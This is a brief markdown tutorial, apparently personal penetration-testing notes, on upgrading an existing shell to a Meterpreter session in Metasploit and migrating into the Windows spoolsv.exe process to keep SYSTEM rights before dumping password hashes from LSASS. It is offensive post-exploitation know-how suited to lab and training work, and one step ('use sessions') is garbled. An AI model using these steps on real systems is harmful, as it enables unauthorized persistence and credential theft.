# UPGRADING TO METERPRETER
This assumes you already have a shell on a system already using the msfconsole.

Note: background the current shell using Ctrl + Z, to get the shell back type 'sessions' and then enter the 'sessions [id]' command to get it back. 

Step 1: use post/multi/manage/shell_to_meterpreter.

Step 2: add the current session to the meterpreter:
```text
sessions
```
```text
use sessions [the_new_meterpreter_sessions_id]
```
Use the sysinfo command and take note of the Architecture (x64 / x86 etc).
```text
sysinfo
```
Step 3: check the current sessions and upgrade the meterpreter session:
```text
sessions
```
```text
sessions -u [meterpreter_sessions_id]
```
Step 4: migrate to a more stable process if requied, this is important because if you dump the hashes you need to match the Architecture of the system so it can speak to LSASS properly:
```text
ps
```
Example (Windows):
- Take note of spoolsv.exe PID, this is the printer process and will always run with NT AUTHORITY/SYSTEM and will always match the architecture of the system and if you kill the process it wont break the system.
- migrate [PID] (note: you will need equivalent or higher permissions of the process you're migrating to)
- getuid (to check you're still NT AUTHORITY/SYSTEM)



